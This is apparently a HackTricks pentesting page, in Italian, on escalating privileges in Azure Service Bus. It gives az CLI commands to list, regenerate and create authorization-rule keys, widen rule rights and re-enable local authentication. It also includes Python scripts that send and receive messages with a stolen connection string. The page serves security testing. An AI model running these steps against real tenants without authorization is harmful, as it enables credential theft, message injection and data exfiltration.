# Az - Service Bus Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Service Bus

Per ulteriori informazioni controlla:

{{#ref}}
../az-services/az-servicebus-enum.md
{{#endref}}

### Microsoft.ServiceBus/namespaces/authorizationrules/listKeys/action OR Microsoft.ServiceBus/namespaces/authorizationrules/regenerateKeys/action

Queste autorizzazioni ti consentono di ottenere o rigenerare le chiavi per le regole di autorizzazione locali all'interno di uno spazio dei nomi Service Bus. Utilizzando queste chiavi è possibile autenticarsi come lo spazio dei nomi Service Bus, consentendoti di inviare messaggi a qualsiasi coda o argomento, ricevere messaggi da qualsiasi coda o sottoscrizione, o potenzialmente interagire con il sistema in modi che potrebbero interrompere le operazioni, impersonare utenti validi o iniettare dati dannosi nel flusso di messaggi.

Nota che per impostazione predefinita la **`RootManageSharedAccessKey` regola ha il controllo completo** sullo spazio dei nomi Service Bus ed è utilizzata dal `az` cli, tuttavia, potrebbero esistere altre regole con altri valori di chiave.
```bash
# List keys
az servicebus namespace authorization-rule keys list --resource-group <res-group> --namespace-name <namespace-name> --authorization-rule-name RootManageSharedAccessKey [--authorization-rule-name RootManageSharedAccessKey]

# Regenerate keys
az servicebus namespace authorization-rule keys renew --key [PrimaryKey|SecondaryKey] --resource-group <res-group> --namespace-name <namespace-name> [--authorization-rule-name RootManageSharedAccessKey]
```
### Microsoft.ServiceBus/namespaces/AuthorizationRules/write

Con questo permesso è possibile **creare una nuova regola di autorizzazione** con tutti i permessi e le proprie chiavi con:
```bash
az servicebus namespace authorization-rule create --authorization-rule-name "myRule" --namespace-name mynamespacespdemo --resource-group Resource_Group_1 --rights Manage Listen Send
```
>[!WARNING]
>Questo comando non restituisce le chiavi, quindi è necessario ottenerle con i comandi (e le autorizzazioni) precedenti per poter elevare i privilegi.

Inoltre, con quel comando (e `Microsoft.ServiceBus/namespaces/authorizationRules/read`) se esegui questa azione tramite l'Azure CLI, è possibile aggiornare una regola di autorizzazione esistente e darle più autorizzazioni (nel caso ne mancassero alcune) con il seguente comando:
```bash
az servicebus namespace authorization-rule update \
--resource-group <MyResourceGroup> \
--namespace-name <MyNamespace> \
--name RootManageSharedAccessKey \
--rights Manage Listen Send
```
### Microsoft.ServiceBus/namespaces/[queues|topics]/authorizationRules/ListKeys/action OR Microsoft.ServiceBus/namespaces/[queues|topics]/authorizationRules/regenerateKeys/action

Argomenti e code specifici all'interno di uno spazio dei nomi Service Bus possono avere le proprie regole di autorizzazione, che possono essere utilizzate per controllare l'accesso all'entità. Avere questi permessi consente di **recuperare o rigenerare le chiavi per queste regole di autorizzazione locali**, permettendoti di autenticarti come l'entità e potenzialmente inviare o ricevere messaggi, gestire le iscrizioni o interagire con il sistema in modi che potrebbero interrompere le operazioni, impersonare utenti validi o iniettare dati dannosi nel flusso di messaggistica.
```bash
# List keys (topics)
az servicebus topic authorization-rule keys list --resource-group <res-group> --namespace-name <namespace-name> --topic-name <topic-name> --name <auth-rule-name>

# Regenerate keys (topics)
az servicebus topic authorization-rule keys renew --key [PrimaryKey|SecondaryKey] --resource-group <res-group> --namespace-name <namespace-name> --topic-name <topic-name> --name <auth-rule-name>

# List keys (queues)
az servicebus queue authorization-rule keys list --resource-group <res-group> --namespace-name <namespace-name> --queue-name <queue-name> --name <auth-rule-name>

# Regenerate keys (queues)
az servicebus queue authorization-rule keys renew --key [PrimaryKey|SecondaryKey] --resource-group <res-group> --namespace-name <namespace-name> --queue-name <queue-name> --name <auth-rule-name>
```
### Microsoft.ServiceBus/namespaces/[queues|topics]/authorizationRules/write

Con questo permesso è possibile **creare una nuova regola di autorizzazione** con tutti i permessi e le proprie chiavi con:
```bash
# In a topic
az servicebus topic authorization-rule create --resource-group <res-group> --namespace-name <namespace-name> --topic-name <topic-name> --name <auth-rule-name> --rights Manage Listen Send

# In a queue
az servicebus queue authorization-rule create --resource-group <res-group> --namespace-name <namespace-name> --queue-name <queue-name> --name <auth-rule-name> --rights Manage Listen Send
```
>[!WARNING]
>Questo comando non restituisce le chiavi, quindi è necessario ottenerle con i comandi (e le autorizzazioni) precedenti per poter elevare i privilegi.

Inoltre, con quel comando (e `Microsoft.ServiceBus/namespaces/[queues|topics]/authorizationRules/read`) se esegui questa azione tramite l'Azure CLI, è possibile aggiornare una regola di autorizzazione esistente e darle più autorizzazioni (nel caso ne mancassero alcune) con il seguente comando:
```bash
# In a topic
az servicebus topic authorization-rule update --resource-group <res-group> --namespace-name <namespace-name> --topic-name <topic-name> --name <auth-rule-name> --rights Manage Listen Send

# In a queue
az servicebus queue authorization-rule update --resource-group <res-group> --namespace-name <namespace-name> --queue-name <queue-name> --name <auth-rule-name> --rights Manage Listen Send
```
### Microsoft.ServiceBus/namespaces/write (& Microsoft.ServiceBus/namespaces/read se viene utilizzato az cli)

Con questi permessi **un attaccante può riattivare "l'autenticazione locale"** con il seguente comando e quindi tutte le chiavi delle politiche condivise funzioneranno.
```bash
az servicebus namespace update --disable-local-auth false -n <namespace-name> --resource-group <res-group>
```
### Invia messaggi con chiavi (Microsoft.ServiceBus/namespaces/authorizationRules/listkeys/action OR Microsoft.ServiceBus/namespaces/authorizationRules/regenerateKeys/action)

Puoi recuperare il `PrimaryConnectionString`, che funge da credenziale per lo spazio dei nomi del Service Bus. Con questa stringa di connessione, puoi autenticarti completamente come lo spazio dei nomi del Service Bus, permettendoti di inviare messaggi a qualsiasi coda o argomento e potenzialmente interagire con il sistema in modi che potrebbero interrompere le operazioni, impersonare utenti validi o iniettare dati dannosi nel flusso di messaggistica.
```python
#You need to install the following libraries
#pip install azure-servicebus
#pip install aiohttp
#pip install azure-identity

import asyncio
from azure.servicebus.aio import ServiceBusClient
from azure.servicebus import ServiceBusMessage

# Constants
NAMESPACE_CONNECTION_STR = "<PrimaryConnectionString>"
TOPIC_NAME = "<TOPIC_NAME>"

# Function to send a single message to a Service Bus topic
async def send_individual_message(publisher):
# Prepare a single message with updated content
single_message = ServiceBusMessage("Hacktricks-Training: Single Item")
# Send the message to the topic
await publisher.send_messages(single_message)
print("Sent a single message containing 'Hacktricks-Training'")

# Function to send multiple messages to a Service Bus topic
async def send_multiple_messages(publisher):
# Generate a collection of messages with updated content
message_list = [ServiceBusMessage(f"Hacktricks-Training: Item {i+1} in list") for i in range(5)]
# Send the entire collection of messages to the topic
await publisher.send_messages(message_list)
print("Sent a list of 5 messages containing 'Hacktricks-Training'")

# Function to send a grouped batch of messages to a Service Bus topic
async def send_grouped_messages(publisher):
# Send a grouped batch of messages with updated content
async with publisher:
grouped_message_batch = await publisher.create_message_batch()
for i in range(10):
try:
# Append a message to the batch with updated content
grouped_message_batch.add_message(ServiceBusMessage(f"Hacktricks-Training: Item {i+1}"))
except ValueError:
# If batch reaches its size limit, handle by creating another batch
break
# Dispatch the batch of messages to the topic
await publisher.send_messages(grouped_message_batch)
print("Sent a batch of 10 messages containing 'Hacktricks-Training'")

# Main function to execute all tasks
async def execute():
# Instantiate the Service Bus client with the connection string
async with ServiceBusClient.from_connection_string(
conn_str=NAMESPACE_CONNECTION_STR,
logging_enable=True) as sb_client:
# Create a topic sender for dispatching messages to the topic
publisher = sb_client.get_topic_sender(topic_name=TOPIC_NAME)
async with publisher:
# Send a single message
await send_individual_message(publisher)
# Send multiple messages
await send_multiple_messages(publisher)
# Send a batch of messages
await send_grouped_messages(publisher)

# Run the asynchronous execution
asyncio.run(execute())
print("Messages Sent")
print("----------------------------")

```
### Ricevi con chiavi (Microsoft.ServiceBus/namespaces/authorizationRules/listkeys/action OR Microsoft.ServiceBus/namespaces/authorizationRules/regenerateKeys/action)

Puoi recuperare il PrimaryConnectionString, che funge da credenziale per il namespace del Service Bus. Utilizzando questa stringa di connessione, puoi ricevere messaggi da qualsiasi coda o sottoscrizione all'interno del namespace, consentendo l'accesso a dati potenzialmente sensibili o critici, abilitando l'exfiltrazione dei dati o interferendo con l'elaborazione dei messaggi e i flussi di lavoro delle applicazioni.
```python
#You need to install the following libraries
#pip install azure-servicebus
#pip install aiohttp
#pip install azure-identity

import asyncio
from azure.servicebus.aio import ServiceBusClient

NAMESPACE_CONNECTION_STR = "<PrimaryConnectionString>"
TOPIC_NAME = "<TOPIC_NAME>"
SUBSCRIPTION_NAME = "<TOPIC_SUBSCRIPTION_NAME>" #Topic Subscription

# Function to receive and process messages from a Service Bus subscription
async def receive_and_process_messages():
# Create a Service Bus client using the connection string
async with ServiceBusClient.from_connection_string(
conn_str=NAMESPACE_CONNECTION_STR,
logging_enable=True) as servicebus_client:

# Get the Subscription Receiver object for the specified topic and subscription
receiver = servicebus_client.get_subscription_receiver(
topic_name=TOPIC_NAME,
subscription_name=SUBSCRIPTION_NAME,
max_wait_time=5
)

async with receiver:
# Receive messages with a defined maximum wait time and count
received_msgs = await receiver.receive_messages(
max_wait_time=5,
max_message_count=20
)
for msg in received_msgs:
print("Received: " + str(msg))
# Complete the message to remove it from the subscription
await receiver.complete_message(msg)

# Run the asynchronous message processing function
asyncio.run(receive_and_process_messages())
print("Message Receiving Completed")
print("----------------------------")
```
## Riferimenti

- https://learn.microsoft.com/en-us/azure/storage/queues/storage-powershell-how-to-use-queues
- https://learn.microsoft.com/en-us/rest/api/storageservices/queue-service-rest-api
- https://learn.microsoft.com/en-us/azure/storage/queues/queues-auth-abac-attributes
- https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-python-how-to-use-topics-subscriptions?tabs=passwordless
- https://learn.microsoft.com/en-us/azure/role-based-access-control/permissions/integration#microsoftservicebus

{{#include ../../../banners/hacktricks-training.md}}
